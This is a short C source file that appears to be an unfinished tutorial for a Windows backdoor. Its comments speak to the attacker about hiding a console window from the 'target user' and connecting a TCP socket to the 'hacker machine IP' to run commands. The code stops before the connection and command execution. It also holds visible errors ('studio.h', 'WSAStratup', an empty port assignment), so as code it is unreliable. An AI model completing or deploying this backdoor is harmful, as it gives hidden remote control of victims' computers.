#include <studio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>

// It's a good lesson to learn what usually import in your code, study these libraries.

// global var
int sock;


int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow){

// This is to create a cmd window that's hidden to the target user, while allowing us to run commands

	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	
	ShowWindow(stealth, 0);


// Creating a class that uses our server address / port to connect from our backdoor	

	struct sockaddr_in ServAddr;
	unsigned short ServPort;	
	char *ServIP; 
	WSADATA wsaData; 

	ServIP = ""; // insert host machine IP here, this is what the program will listen to when running the commands (hacker machine IP)
	ServPort = ; // suggest using a free port like one with no other applications on it e.g. 50005

//  checking if the result of WSAStart up = 0 or not, if 0 exit else proceed.

	if (WSAStratup(MAKEWORD(2,0), &wsaData) != 0) {
	exit(1);
	}


// Defining our socket object (IPV4, TCP CONNECTION, NULL)

	sock = socket(AF_INET, SOCK_STREAM, 0);


// Defining out ServAddr as it is a struct

	memset(&ServAddr, 0, sizeof(ServAddr)); // clears memory and set to 0;
	ServAddr.sin_family = AF_INET;
	ServAddr.sin_addr.s_addr = inet_addr(ServIP); // converting string IP to IP format
	ServAddr.sin_port = htons(ServPort); // converting string port to port format

}
